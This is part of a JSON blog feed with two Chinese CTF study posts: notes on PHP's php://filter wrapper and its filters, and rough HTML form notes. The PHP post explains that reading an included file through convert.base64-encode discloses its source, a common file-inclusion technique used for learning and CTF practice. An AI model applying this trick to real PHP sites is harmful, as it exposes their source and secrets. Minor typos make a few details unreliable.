            "content_html": "<h1 id=\"php伪协议\"><a class=\"anchor\" href=\"#php伪协议\">#</a> PHP 伪协议</h1>\n<p>php:// 用来访问输入和输出流（I/O streams）。<br />\n输入 / 输出流也就是「数据流」，数据流可以是某个文件（xx.php）或某个 url（<a href=\"http://www.baidu.com\">http://www.baidu.com</a>）。</p>\n<p>php://filter 可以在访问数据流之前进行「过滤」，并指定过滤方式。</p>\n<p>php://filter 有 4 个可用参数：</p>\n<p>名称\t描述<br />\n resource=&lt;要过滤的数据流&gt;\t这个参数是必须的。它指定了你要筛选过滤的数据流。<br />\nread=&lt;读链的筛选列表&gt;\t该参数可选。可以设定一个或多个过滤器名称<br />\n write=&lt;写链的筛选列表&gt;\t该参数可选。可以设定一个或多个过滤器名称<br />\n &lt;；两个链的筛选列表&gt;\t任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</p>\n<h2 id=\"一-访问数据流\"><a class=\"anchor\" href=\"#一-访问数据流\">#</a> 一、访问数据流</h2>\n<p>直接「读取」数据源的内容，resource 参数必须位于 php://filter 的末尾，并指定需要过滤筛选的数据流。</p>\n<p><strong>1）读取「url 形式」的数据流。</strong></p>\n<p>#等同于 readfile*('<a href=\"http://www.baidu.com\">http://www.baidu.com</a>');*</p>\n<p>readfile('php://filter/resource=<a href=\"http://www.baidu.com\">http://www.baidu.com</a>');</p>\n<p><strong>2）读取「文件形式」的数据流。</strong></p>\n<p><em># 等同于 include ('hello.php');</em></p>\n<p>include('php://filter/resource=hello.php');</p>\n<h2 id=\"二-过滤数据流\"><a class=\"anchor\" href=\"#二-过滤数据流\">#</a> 二、过滤数据流</h2>\n<p>读取数据源之前，添加「过滤条件」。</p>\n<p>1）以「大写字母」读取  <code>http://www.baidu.com</code>  页面的全部内容</p>\n<p>readfile(&quot;php://filter/read=<strong>string.toupper</strong>/resource=<a href=\"http://www.baidu.com\">http://www.baidu.com</a>&quot;);</p>\n<p>2）以「小写字母」读取  <code>hello.php</code>  文件的全部内容</p>\n<p>include(&quot;php://filter/read=<strong>string.tolower</strong>/resource=hello.php&quot;);</p>\n<p>3）将  <code>hello.php</code>  文件的内容「base64 加密」后读取出来。<br />\ninclude () 包含的文件，默认会执行文件中的代码，<strong>但加密后的内容不会被执行，而是直接输出在页面中</strong>，复制后解密就能拿到被包含文件的内容。</p>\n<h2 id=\"三-多个过滤条件\"><a class=\"anchor\" href=\"#三-多个过滤条件\">#</a> 三、多个过滤条件</h2>\n<p>同时使用「多个过滤条件」时，使用<strong>管道符 | 分隔</strong>。</p>\n<p>1）base64 加密并且转换为大写</p>\n<p>&lt;?php</p>\n<p>include('php://filter/read=convert.base64-encode|string.toupper/resource=hello.php');<br />\n 按照「从左到右」的顺序过滤，过滤条件的顺序可能会影响过滤的结果</p>\n<h2 id=\"四-过滤并写入数据流\"><a class=\"anchor\" href=\"#四-过滤并写入数据流\">#</a> 四、过滤并写入数据流</h2>\n<p>write 参数，过滤指定字符，并将过滤后的结果「输出」到指定文件中。</p>\n<p>1）过滤字符，并输出到 result.txt 文件中。</p>\n<p>&lt;?php file_put_contents('php://filter/write=string.tolower/resource=result.txt','hello text');</p>\n<h2 id=\"五-过滤器\"><a class=\"anchor\" href=\"#五-过滤器\">#</a> 五、过滤器</h2>\n<h3 id=\"1-stringrot13\"><a class=\"anchor\" href=\"#1-stringrot13\">#</a> 1、string.rot13</h3>\n<p>对数据流的内容进行「rot13 编码」，等于用 str_rot13 () 函数编码。</p>\n<p>ROT13（otate by 13 places）也叫回转 13 位，是一种替换式密码。</p>\n<p>ROT13 会把每一个字母替换成 13 位之后的字母，也就是把 a 换成 n，b 换成 o，以此类推；如果超过了 26 个字母的范围，就会从开头重新开始。</p>\n<h3 id=\"2-stringtoupper\"><a class=\"anchor\" href=\"#2-stringtoupper\">#</a> 2、string.toupper</h3>\n<p>将数据流转换成「大写」，类似于 strupper () 函数</p>\n<p>不是直接将文件内容变成大写，而是先执行文件内容，再将执行后的结果转换成大写。</p>\n<h3 id=\"3-stringtolower\"><a class=\"anchor\" href=\"#3-stringtolower\">#</a> 3、string.tolower</h3>\n<p>将数据流转换成「小写」，类似 strtolower () 函数。</p>\n<p>也是先执行文件的内容，再将执行后的结果转换成小写。</p>\n<h3 id=\"4-convertbase64-encode\"><a class=\"anchor\" href=\"#4-convertbase64-encode\">#</a> 4、convert.base64-encode</h3>\n<p>对数据流的内容进行「base64 编码」，相当于 base64_encode () 函数。</p>\n<p>编码后的内容可以使用 base64_decode () 函数解码</p>\n<h3 id=\"5-converticonv\"><a class=\"anchor\" href=\"#5-converticonv\">#</a> 5、convert.iconv.*</h3>\n<p>将数据流的内容按照「指定字符编码」来转换，使用格式有两种：</p>\n<p>格式一： <code>.</code>  分隔</p>\n<p>convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</p>\n<p>格式二： <code>/</code>  分隔</p>\n<p>convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</p>\n<p>ex:convert.iconv.utf-8*.utf-16* 的意思就是把文件的字符编码从 utf-8* 转换为 utf-16*</p>\n<p>支持的编码字符有</p>\n<pre><code>UCS-4*\nUCS-4BE\nUCS-4LE*\nUCS-2\nUCS-2BE\nUCS-2LE\nUTF-32*\nUTF-32BE*\nUTF-32LE*\nUTF-16*\nUTF-16BE*\nUTF-16LE*\nUTF-7\nUTF7-IMAP\nUTF-8*\nASCII*\nEUC-JP*\nSJIS*\neucJP-win*\nSJIS-win*\nISO-2022-JP\nISO-2022-JP-MS\nCP932\nCP51932\nSJIS-mac (alias: MacJapanese)\nSJIS-Mobile#DOCOMO (alias: SJIS-DOCOMO)\nSJIS-Mobile#KDDI (alias: SJIS-KDDI)\nSJIS-Mobile#SOFTBANK (alias: SJIS-SOFTBANK)\nUTF-8-Mobile#DOCOMO (alias: UTF-8-DOCOMO)\nUTF-8-Mobile#KDDI-A\nUTF-8-Mobile#KDDI-B (alias: UTF-8-KDDI)\nUTF-8-Mobile#SOFTBANK (alias: UTF-8-SOFTBANK)\nISO-2022-JP-MOBILE#KDDI (alias: ISO-2022-JP-KDDI)\nJIS\nJIS-ms\nCP50220\nCP50220raw\nCP50221\nCP50222\nISO-8859-1*\nISO-8859-2*\nISO-8859-3*\nISO-8859-4*\nISO-8859-5*\nISO-8859-6*\nISO-8859-7*\nISO-8859-8*\nISO-8859-9*\nISO-8859-10*\nISO-8859-13*\nISO-8859-14*\nISO-8859-15*\nISO-8859-16*\nbyte2be\nbyte2le\nbyte4be\nbyte4le\nBASE64\nHTML-ENTITIES (alias: HTML)\n7bit\n8bit\nEUC-CN*\nCP936\nGB18030\nHZ\nEUC-TW*\nCP950\nBIG-5*\nEUC-KR*\nUHC (alias: CP949)\nISO-2022-KR\nWindows-1251 (alias: CP1251)\nWindows-1252 (alias: CP1252)\nCP866 (alias: IBM866)\nKOI8-R*\nKOI8-U*\nArmSCII-8 (alias: ArmSCII8)\n\n</code></pre>\n",
            "tags": [
                "CTF",
                "Web"
            ]
        },
        {
            "id": "https://ly1tnt.github.io/2023/10/10/CTF/Web/HTML/",
            "url": "https://ly1tnt.github.io/2023/10/10/CTF/Web/HTML/",
            "title": "HTML笔记",
            "date_published": "2023-10-10T12:24:00.000Z",
            "content_html": "<h1 id=\"html\"><a class=\"anchor\" href=\"#html\">#</a> #HTML</h1>\n<p>W3C world wie web construction 万维网联盟</p>\n<p>hyper text markup language 超文本标记语言</p>\n<p>分段标签 &lt;p&gt;&lt;/p&gt;</p>\n<p>水平线标签 &lt;hr/&gt;</p>\n<p>换行标签 &lt;br/&gt;</p>\n<p>标题标签 &lt;h1&gt;&lt;/h1&gt;</p>\n<p>粗体 &lt;strong&gt;&lt;/strong&gt;</p>\n<p>斜体 &lt;em&gt;&lt;/em&gt;</p>\n<p>空格 &amp;nbsp</p>\n<p>特殊符号 &amp; 开头，随用随调</p>\n<hr />\n<p>src: 图片地址 (必填)</p>\n<p>​         相对地址 (更推荐) 绝对地址</p>\n<p>​          ../-- 上一级目录</p>\n<p>alt: 图片名字 (必填)</p>\n<p>title: 悬停文字</p>\n<hr />\n<p>内联框架</p>\n<p>iframe src=&quot;path&quot; name=&quot;&quot;</p>\n<hr />\n<p>![屏幕截图 2023-10-05 111559](C:\\Users\\lin\\Pictures\\Screenshots\\ 屏幕截图 2023-10-05 111559.png)![屏幕截图 2023-10-05 110216](C:\\Users\\lin\\Pictures\\Screenshots\\ 屏幕截图 2023-10-05 110216.png)</p>\n<p>value: 默认初始值 maxlength= (最长能写几个文字) size= (文本框的长度)</p>\n<p>下拉框 列表框</p>\n<p>select name=“”</p>\n<p>​        option value=      &gt;  &lt;/option</p>\n<p>/select</p>\n<hr />\n<p>文件域</p>\n<p>input type=&quot;file&quot; name=&quot;&quot;</p>\n<p>input type=&quot;button&quot;value=&quot;&quot;name=&quot;&quot;</p>\n<p>邮箱验证</p>\n<p>input type=&quot;email&quot; name=&quot;&quot;</p>\n<p>URL</p>\n<p>input type=&quot;url&quot; name=&quot;&quot;</p>\n<p>数字</p>\n<p>input type=&quot;number&quot; name=&quot;&quot; max=&quot;&quot; min=&quot;&quot; step=&quot;&quot;</p>\n<p>滑块</p>\n<p>input type=&quot;range&quot; name=&quot;&quot; min=&quot;&quot; max=&quot;&quot;</p>\n<p>搜索框</p>\n<p>input type=&quot;search&quot; name=&quot;&quot;</p>\n<hr />\n<p>隐藏域 hidden</p>\n<p>只读 readonly</p>\n<p>禁用 disabled</p>\n<p>增强鼠标可用性</p>\n<p>label for=&quot;&quot;  /label</p>\n<hr />\n<p>placeholder=&quot;&quot;(提示信息)</p>\n<p>required (非空判断)</p>\n<p>pattern 正则表达式？</p>\n<hr />\n",
            "tags": [
                "CTF",
                "Web"
            ]
        }
    ]
}